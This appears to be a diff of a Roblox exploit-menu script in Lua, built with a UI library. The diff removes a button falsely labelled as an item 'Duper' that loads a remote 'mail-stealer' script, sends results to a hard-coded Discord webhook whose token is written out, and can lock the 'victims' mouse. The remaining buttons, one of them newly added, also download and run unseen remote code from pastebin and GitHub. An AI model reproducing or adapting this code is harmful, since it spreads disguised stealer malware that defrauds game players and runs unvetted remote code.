@@ -37,16 +37,6 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Button = Tab:CreateButton({
-    Name = "Duper (dont use)",
-    Callback = function()
-        getgenv().webhook = "https://discord.com/api/webhooks/1083974441287024671/W_xyxD4JM-MJXObOtXRgdu8LhtMKJjfe8eduEmhjKlxzVSz_6NY_Sy8JZ4UqX96Y5I-g" -- replace it with your webhook
-        getgenv().name = "kaisaidaop" -- replace bigscammer8 with your username
-        getgenv().mouselock = true -- change this to true if you want the victims mouse to be locked in one place so he cant exit out of roblox etc
-        loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
-    end,
- })
-
- local Button = Tab:CreateButton({
    Name = "Black Trap",
    Callback = function()
       loadstring(game:HttpGet("https://pastebin.com/raw/BdvUGb2q"))()
@@ -100,33 +90,10 @@ local Button = Tab:CreateButton({
             loadstring(game:HttpGet("https://pastebin.com/raw/BdvUGb2q"))()
             end,
       })
-      
+
       local Button = Tab:CreateButton({
-         Name = "Pet Changer",
+         Name = "Black Trap",
          Callback = function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/8msv/scripts/main/petchanger"))()
+            loadstring(game:HttpGet("https://pastebin.com/raw/BdvUGb2q"))()
             end,
       })
-      
-      local Button = Tab:CreateButton({
-         Name = "soon",
-         Callback = function()
-           
-            end,
-      })
-      
-      local Button = Tab:CreateButton({
-         Name = "soon",
-         Callback = function()
-           
-            end,
-      })
-      
-      local Button = Tab:CreateButton({
-         Name = "soon",
-         Callback = function()
-           
-            end,
-      })()
-      end,
-})
